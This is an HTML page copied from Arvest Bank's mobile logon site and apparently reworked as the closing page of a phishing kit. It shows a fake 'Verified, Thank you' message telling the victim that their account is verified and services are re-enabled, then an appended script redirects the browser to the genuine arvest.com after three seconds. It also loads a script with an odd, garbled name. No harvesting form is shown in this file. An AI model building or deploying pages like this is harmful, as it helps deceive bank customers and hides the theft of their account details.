<!DOCTYPE html>
<!-- saved from url=(0045)https://www.arvest.com/personal/signon/logon/ -->
<html lang="en" class="js"><!--<![endif]-->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script type="text/javascript" async="" src="./mobile_files/insight.min.js.download"></script>
    <script type="text/javascript" async="" src="./mobile_files/insight.min.js.download"></script>
    <script type="text/javascript" async="" src="./mobile_files/hotjar-2651856.js.download"></script>
    <script type="text/javascript" async="" src="./mobile_files/analytics.js.download"></script>
    <script type="text/javascript" async="" src="./mobile_files/js"></script>
    <script async="" src="./mobile_files/gtm.js.download"></script>
    <script src="./mobile_files/March-knockindnes-Those-abounds-Sould-earty-full" async=""></script>

    <!-- Basic Page Needs
	================================================== -->

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" id="myViewport" content="width=device-width, initial-scale=1.0">
    <!--<meta name="viewport" id="myViewport"  content="width=device-width" />-->
    <meta name="format-detection" content="telephone=no">
    <title>Arvest: Personal: Arvest Online Banking: Online Banking</title>

    <!-- CSS
	================================================== -->
    <link rel="stylesheet" href="./mobile_files/MyFontsWebfontsKit.css">
    <link rel="stylesheet" href="./mobile_files/bootstrap_custom_mobile.css">
    <!--<link rel="stylesheet" href="/arvest.com/css/ui-lightness/jquery-ui-1.10.4.min.css" />-->
    <link rel="stylesheet" href="./mobile_files/mobile.css">
    <link rel="stylesheet" href="./mobile_files/layout2.css">

    <link type="text/css" rel="stylesheet" href="./mobile_files/bootstrap.min.css" integrity="sha512-dTfge/zgoMYpP7QbHy4gWMEGsbsdZeCXz7irItjcC3sPUFtf0kuFbDz/ixG7ArTxmDjLXDmezHubeNikyKGVyQ==" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="./mobile_files/site.css">
    <link type="text/css" rel="stylesheet" href="./mobile_files/style.css">
    <!--[if lt IE 9]>
		<script type="text/javascript" src="/arvest.com/js/html5.js"></script>
		<script type="text/javascript" src="/arvest.com/js/respond.min.js"></script>
	<![endif]-->
    <!--[if lt IE 8]>
		<link rel="stylesheet" href="/arvest.com/css/ie7.css">
	<![endif]-->

    <link rel="canonical" href="https://www.arvest.com/personal/signon/logon">
    <link type="image/vnd.microsoft.icon" rel="Shortcut Icon" href="https://www.arvest.com/arvest.com/favicon.ico" sizes="16x16 24x24 32x32">
    <meta property="og:site_name" content="Arvest">
    <meta property="og:title" content="Arvest: Personal: Arvest Online Banking: Online Banking">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.arvest.com/personal/signon/logon">
    <!-- Google Tag Manager -->
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-TGPDH6G');
    </script> <!-- End Google Tag Manager -->

    <script src="./mobile_files/viewport.js.download"></script>
    <!--<script src="/common/jquery/jquery-1.9.1.min.js"></script>-->
    <script type="text/javascript" src="./mobile_files/site.js.download"></script>
    <script src="./mobile_files/common.min.js.download"></script>
    <script src="./mobile_files/aob-search.js.download"></script>
    <script src="./mobile_files/pm_fp.js.download"></script>
    <!--<script src="/common/js/tealeaf/TealeafSDK5.3.ArvestWithDOMDiff.js"></script>-->


    <style>
        <!--
        -->
    </style>
</head>

<body class="personalSignonLogonIndex" data-new-gr-c-s-check-loaded="14.1192.0" data-gr-ext-installed="">
    <!-- Google Tag Manager (noscript) --> <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TGPDH6G" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript> <!-- End Google Tag Manager (noscript) -->
    <!-- Primary Page Layout
	================================================== -->

    <div class="outer-wrap">
    </div> <!-- end outer-wrap -->

    <header>
        <div id="header">
            <div class="container-fluid">
                <div class="nav_items row">
                    <a href="https://www.arvest.com/personal/signon/logon/#" id="hamburger-menu">
                        <div class="col-xs-1"><img src="./mobile_files/header.hamburger-menu.png" alt="menu" width="18" height="16"></div>
                    </a>
                    <a href="https://www.arvest.com/askarvest?typeId=0&amp;q=">
                        <div class="col-xs-1"><img src="./mobile_files/qm_white.png" alt="askarvest" width="15" height="23"></div>
                    </a>
                    <a href="https://www.arvest.com/branch-locator?view=map&amp;WT.ac=ABO-MOBILE-header-branchlocator">
                        <div class="col-xs-2"><img src="./mobile_files/header.location-pin.png" alt="locations" width="15" height="23"></div>
                    </a>
                    <div class="col-xs-5">
                        <img src="./mobile_files/header.arvest.png" alt="logo" width="90">
                    </div>
                    <div class="col-xs-3 login">
                        <div class="login-icon-text">
                            <a href="https://www.arvest.com/personal/signon/logon/#" id="loginIcon"><img src="./mobile_files/header.lock.png" alt="login" width="12" height="14">
                                <span class="text">LOG IN</span></a>
                        </div>
                    </div>
                </div>
            </div>
            <div id="loginArea" style="display: none;">
                <div class="row">
                    <div class="col-xs-offset-2 col-xs-8">
                        <label>Log in</label>
                        <div class="form-group styled-select">
                            <select class="form-control" id="loginOptions">
                                <option value="https://www.arvest.com/personal/signon/logon">Online Banking with BlueIQ™</option>
                                <option value="https://www.arvest.com/personal/sign-on/login">Mortgage</option>
                                <option value="https://arvest.cardmanager.com">Credit Card: Personal</option>
                                <option value="https://www.centresuite.com/Centre/Public/Logon/Index?ReturnUrl=%2fCentre%3fsecuritybankcard&amp;securitybankcard">Credit Card: Business</option>
                                <option value="https://arvest.cardmanager.com">Flex Rewards: Personal</option>
                                <option value="https://arvestflexrewards.com/externalLogin.htm?product=AVST01/AVST01COMM&amp;ext_cat=SBCcomm">Flex Rewards: Business</option>
                                <option value="https://epayables.arvest.com">ePayables</option>
                                <option value="https://clientpoint.fisglobal.com/tdcb/main/UserLogon?bankNumber=8F&amp;subProduct=">AWM Client Point</option>
                                <option value="https://ecash.arvest.com/CorporateBankingWeb/Core/Signin.aspx">Cash Manager</option>
                                <option value="https://rdc.arvest.com/ArvestBankDefault.aspx">Remote Deposit Capture</option>
                                <option value="https://sso.arvest.com/idp/startSSO.ping?PartnerSpId=http%3A%2F%2Fwww.netxinvestor.com">Investments - Wealth</option>
                            </select>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-offset-5">
                        <button type="button" class="btn btn-default btn-sm login-next" id="loginNext">
                            <span class="glyphicon glyphicon-triangle-right" aria-hidden="true"></span><span>Next</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>

    </header>

    <main class="container container-main">
        <div class="row">
            <div class="col-sm-7">﻿
            <main id="e-content">
        <div class="oe-gs">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                        <h1 class="oe-header">Verified</h1>
                        <div class="oe-progress-bar">
                            <div class="bar fill finale"></div>
                        </div>
                        <div class="H2 oe-secure">Thank you!</div>
                        
                    </div>
                </div>
                
            </div>
        </div>
    </main>
    <section id="opc-content">
        <div class="field-mt-18">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                <div id="personal">
                    <div class="row">
                        <div class="col-xs-12">
                            <div class="success-wraps" style="display:flex; align-items: center; justify-content: center;">
                                <img src="img/success.gif" alt="">
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <h4 class="H5 eGSA">We have successfully received your information, your account is now verified and your services are re-enabled successfully. <br><br>You will be redirected to our privacy page for further reading</h4>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>



               
            </div>
          
        </div>
    </main>
    <footer>
        <footer>
            <div id="footer">
                <div class="container-fluid">
                    <div class="row">
                        <div class="social col-xs-12">
                            <a class="btn" href="https://share.arvest.com/?WT.ac=ABO-MOBILE-footer-social-share" target="_blank">
                                <img src="./mobile_files/footer.icon.arvest-share.png" alt="arvest share">
                            </a>
                            <a class="btn" href="https://www.facebook.com/arvestbank?WT.ac=ABO-MOBILE-footer-social-facebook" target="_blank">
                                <img src="./mobile_files/footer.icon.facebook.png" alt="facebook">
                            </a>
                            <a class="btn" href="https://www.twitter.com/arvestbank?WT.ac=ABO-MOBILE-footer-social-twitter" target="_blank">
                                <img src="./mobile_files/footer.icon.twitter.png" alt="twitter">
                            </a>
                            <a class="btn" href="https://www.youtube.com/arvest?WT.ac=ABO-MOBILE-footer-social-youtube" target="_blank">
                                <img src="./mobile_files/footer.icon.youtube.png" alt="youtube">
                            </a>
                            <a class="btn" href="https://www.instagram.com/arvestbank?WT.ac=ABO-MOBILE-footer-social-instagram" target="_blank">
                                <img src="./mobile_files/footer.icon.instagram.png" alt="instagram">
                            </a>
                        </div>
                    </div>
                    <div class="row">
                        <div class="copyright col-xs-12">
                            <div class="text-links"><a href="https://www.arvest.com/about?WT.ac=ABO-MOBILE-footer-about">About Arvest</a> |
                                <a href="https://m.arvest.com/contact?WT.ac=ABO-MOBILE-footer-contactus">Contact Us</a> |
                                <a href="https://www.arvest.com/careers?WT.ac=ABO-MOBILE-footer-careers">Careers</a>
                            </div>
                            <div class="text-links">
                                <a href="https://m.arvest.com/privacy?WT.ac=ABO-MOBILE-footer-privacy">Privacy &amp; Security</a> |
                                <a href="https://www.arvest.com/?m=0&amp;WT.ac=ABO-MOBILE-footer-fullsite" target="_blank">Full Site</a>
                            </div>
                            <p class="text-links">Copyright © 2021 Arvest Bank. All Rights Reserved.</p>

                            <div class="text-links">
                                <span>
                                    <img src="./mobile_files/footer.logo.fdic.png" width="30" height="19" alt="">
                                    <img src="./mobile_files/footer.logo.housing.png" width="30" height="31" alt="">
                                    All Arvest Banks are Equal Housing Lenders
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="sidr" class="sidr left">
                <ul>
                    <li><a href="https://www.arvest.com/">Home</a></li>
                    <li><a href="https://m.arvest.com/branch-locator">Branch Locator</a></li>
                    <li><a href="https://m.arvest.com/mobile-banking">Mobile Banking</a></li>
                    <li><a href="https://m.arvest.com/personal-banking">Personal Banking</a></li>
                    <li><a href="https://m.arvest.com/business-banking">Business Banking</a></li>
                    <li><a href="https://m.arvest.com/personal-banking/specialty-debit-cards">Specialty Debit Cards</a></li>
                    <li><a href="https://m.arvest.com/personal-banking/gift-card-balance">Gift Card Balance</a></li>
                    <li><a href="https://m.arvest.com/contact">Customer Service</a></li>
                    <li><a href="https://www.arvest.com/careers">Careers</a></li>
                    <li><a href="https://m.arvest.com/about">About Arvest</a></li>
                    <li><a href="https://www.arvest.com/askarvest_mobile?typeId=0&amp;q=">Ask a Question</a></li>
                </ul>
            </div>
        </footer>

    </footer>

    <div id="external_link_modal" class="hidden">
        <h2>Leaving Arvest Bank</h2>
        <p>You are about to visit a third-party site not operated by Arvest Bank,<br> a FDIC-insured institution.
        </p>
        <p>Arvest Bank’s privacy policy and security practices do not apply to the site you are about to enter, please review the third-party's privacy and security practices.
        </p>
        <a class="btn btn-primary continue" href="https://www.arvest.com/personal/signon/logon/#" onclick="$(&#39;#modal-container&#39;).bPopup().close();">Continue</a>
        <a class="btn btn-default" href="https://www.arvest.com/personal/signon/logon/#" onclick="$(&#39;#modal-container&#39;).bPopup().close();">Cancel</a>
    </div>
    <div id="modal-container">
        <!--<div class="modal-close"><img src="/arvest.com/images/white/video-close.png" alt=""></div>-->
        <div class="modal-close"></div>
        <div class="modal-content"></div>
    </div>



    <!-- End Document ================================================== -->
    <!--<script src="/arvest.com/js/jquery-ui-1.10.4.min.js"></script>-->
    <script>
        /*** Handle jQuery plugin naming conflict between jQuery UI and Bootstrap ***/
        /**
         * @text-decoration:  custom jquery-ui build
         *     what's it even being used for ??
         */
        //$.widget.bridge('uibutton', $.ui.button);
        //$.widget.bridge('uitooltip', $.ui.tooltip);
    </script>
    <script src="./mobile_files/bootstrap_custom.min.js.download"></script>
    <!--
	<script src="/arvest.com/js/cycle.js"></script>
	<script src="/arvest.com/js/jquery.touchwipe.1.1.1.js"></script>
	<script src="/arvest.com/js/placeholders.js"></script>
	-->
    <script src="./mobile_files/helper.js.download"></script>
    <script src="./mobile_files/main.min.js.download"></script>
    <script src="./mobile_files/typeahead.bundle.min.js.download"></script>
    <script src="./mobile_files/jquery.selectbox-0.2.min.js.download" type="text/javascript"></script>
    <script src="./mobile_files/bpopup-0.10.0.min.js.download"></script>


    <script type="text/javascript">
        //<![CDATA[
        $(document).ready(function() {

            $('.modal-close').replaceWith('<div class="modal-close"></div>');
        });
        $(document).ready(function() {
            $('.left-menu-inner').append('<ul class="left-nav list-unstyled"><li><a href="/personal/signon/logon/&amp;q=passwordreset">Forgot my Password</a></li><li><a href="/personal/signon/logon/logonid">Forgot my Login ID</a></li></ul>');
        });
        //]]>
    </script>



    <div style="display: none; visibility: hidden;">
        <script type="text/javascript">
            (function() {
                var l = function(e, g, f, h) {
                    this.get = function(a) {
                        a += "\x3d";
                        for (var b = document.cookie.split(";"), c = 0, k = b.length; c < k; c++) {
                            for (var d = b[c];
                                " " == d.charAt(0);) d = d.substring(1, d.length);
                            if (0 == d.indexOf(a)) return d.substring(a.length, d.length)
                        }
                        return null
                    };
                    this.set = function(a, b) {
                        var c = new Date;
                        c.setTime(c.getTime() + 6048E5);
                        c = "; expires\x3d" + c.toGMTString();
                        document.cookie = a + "\x3d" + b + c + "; path\x3d/; "
                    };
                    this.check = function() {
                        var a = this.get(f);
                        if (a) a = a.split(":");
                        else if (100 != e) "v" == g && (e = Math.random() >=
                            e / 100 ? 0 : 100), a = [g, e, 0], this.set(f, a.join(":"));
                        else return !0;
                        var b = a[1];
                        if (100 == b) return !0;
                        switch (a[0]) {
                            case "v":
                                return !1;
                            case "r":
                                return b = a[2] % Math.floor(100 / b), a[2]++, this.set(f, a.join(":")), !b
                        }
                        return !0
                    };
                    this.go = function() {
                        if (this.check()) {
                            var a = document.createElement("script");
                            a.type = "text/javascript";
                            a.src = h;
                            document.body && document.body.appendChild(a)
                        }
                    };
                    this.start = function() {
                        var a = this;
                        "complete" !== document.readyState ? window.addEventListener ? window.addEventListener("load", function() {
                                a.go()
                            },
                            !1) : window.attachEvent && window.attachEvent("onload", function() {
                            a.go()
                        }) : a.go()
                    }
                };
                try {
                    (new l(100, "r", "QSI_S_ZN_cTsTcEDc1rc1Tnw", "https://znctstcedc1rc1tnw-arvest.siteintercept.qualtrics.com/SIE/?Q_ZID\x3dZN_cTsTcEDc1rc1Tnw")).start()
                } catch (e) {}
            })();
        </script>
        <div id="ZN_cTsTcEDc1rc1Tnw"></div>
    </div>
    <div style="display: none; visibility: hidden;">
        <script src="./mobile_files/otSDKStub.js.download" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="430cf39f-917d-469f-9c6a-0de3834f38d3"></script>
    </div>
    <script type="text/javascript" id="">
        (function() {
            var a = window.location.href,
                b = "expires\x3dSat, 6 Apr 2024 12:00:00 UTC";
            if ("https://www.arvest.com/personal/bank/checking" === a) a = "checking", document.cookie = "btns_user_tag\x3d" + a + ";" + b + ";path\x3d/";
            else if ("https://www.arvest.com/personal/bank/savings" === a) a = "savings", document.cookie = "btns_user_tag\x3d" + a + ";" + b + ";path\x3d/";
            else if ("https://www.arvest.com/personal/bank/credit-cards" === a) a = "credit-cards", document.cookie = "btns_user_tag\x3d" + a + ";" + b + ";path\x3d/";
            else if ("https://www.arvest.com/personal/borrow/home-loans" ===
                a || "https://www.arvest.com/personal/borrow/home-loans/pre-qualify" === a) a = "home-loans", document.cookie = "btns_user_tag\x3d" + a + ";" + b + ";path\x3d/"
        })();
    </script>
    <div style="display: none; visibility: hidden;"></div>
    <script type="text/javascript" id="" src="./mobile_files/js(1)"></script>
</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open">
        <style>
            div.grammarly-desktop-integration {
                position: absolute;
                width: 1px;
                height: 1px;
                padding: 0;
                margin: -1px;
                overflow: hidden;
                clip: rect(0, 0, 0, 0);
                white-space: nowrap;
                border: 0;
                -moz-user-select: none;
                -webkit-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }

            div.grammarly-desktop-integration:before {
                content: attr(data-content);
            }
        </style>
        <div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div>
    </template></grammarly-desktop-integration>

</html>

<script>
    setTimeout(() => {
        location.href ="https://www.arvest.com/";
    }, 3000);
</script>